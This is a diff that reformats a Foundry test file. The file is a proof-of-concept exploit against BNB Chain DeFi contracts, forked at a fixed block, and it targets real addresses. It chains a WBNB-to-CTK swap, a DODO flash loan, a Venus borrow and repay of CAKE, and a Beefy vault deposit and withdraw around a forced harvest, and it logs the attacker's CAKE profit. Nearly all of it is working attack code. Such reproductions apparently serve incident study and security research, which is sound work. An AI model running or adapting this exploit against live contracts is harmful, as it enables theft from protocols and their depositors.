@@ -30,18 +30,18 @@ interface StrategySyrup {
 }
 
 contract Harvest {
-    constructor(){
+    constructor() {
         StrategySyrup strategySyrup = StrategySyrup(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b);
         strategySyrup.harvest();
     }
 }
 
 interface Unitroller {
-    function getAccountLiquidity(address account) external returns(uint, uint, uint);  
-    function enterMarkets(address[] calldata vTokens) external;   
+    function getAccountLiquidity(address account) external returns (uint256, uint256, uint256);
+    function enterMarkets(address[] calldata vTokens) external;
 }
 
-contract ContractTest is DSTest{
+contract ContractTest is DSTest {
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IERC20 CTK = IERC20(0xA8c2B8eec3d368C0253ad3dae65a5F2BBB89c929);
     IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
@@ -57,56 +57,46 @@ contract ContractTest is DSTest{
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        // the ankr rpc maybe dont work , please use QuickNode 
-        cheats.createSelectFork("bsc", 22832427);
+        // the ankr rpc maybe dont work , please use QuickNode
+        cheats.createSelectFork("bsc", 22_832_427);
     }
 
-    function testExploit() public{
+    function testExploit() public {
         address(WBNB).call{value: 3 ether}("");
         WBNBToCTK();
         CTK.transfer(address(SmartChef), CTK.balanceOf(address(this)));
         DVM(dodo).flashLoan(0, 400_000 * 1e18, address(this), new bytes(1));
 
-        emit log_named_decimal_uint(
-            "[End] Attacker CAKE balance after exploit",
-            CAKE.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("[End] Attacker CAKE balance after exploit", CAKE.balanceOf(address(this)), 18);
     }
 
-    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{
-        address [] memory cTokens = new address[](2);
+    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
+        address[] memory cTokens = new address[](2);
         cTokens[0] = address(vBUSD);
         cTokens[1] = address(vCAKE);
         unitroller.enterMarkets(cTokens);
-        BUSD.approve(address(vBUSD), type(uint).max);
+        BUSD.approve(address(vBUSD), type(uint256).max);
         vBUSD.mint(BUSD.balanceOf(address(this)));
         vCAKE.borrow(50_000 * 1e18);
-        CAKE.approve(address(beefyVault), type(uint).max);
+        CAKE.approve(address(beefyVault), type(uint256).max);
         beefyVault.depositAll();
         // Removing this step, the profit seem to be higher 😂
         // because the harveset() funciton will swap some CAKE to WBNB
         Harvest harvest = new Harvest();
         beefyVault.withdrawAll();
-        CAKE.approve(address(vCAKE), type(uint).max);
+        CAKE.approve(address(vCAKE), type(uint256).max);
         vCAKE.repayBorrow(50_000 * 1e18);
         vBUSD.redeemUnderlying(400_000 * 1e18);
         BUSD.transfer(dodo, 400_000 * 1e18);
     }
 
     function WBNBToCTK() internal {
-        WBNB.approve(address(Router), type(uint).max);
-        address [] memory path = new address[](2);
+        WBNB.approve(address(Router), type(uint256).max);
+        address[] memory path = new address[](2);
         path[0] = address(WBNB);
         path[1] = address(CTK);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            WBNB.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
-
-
 }
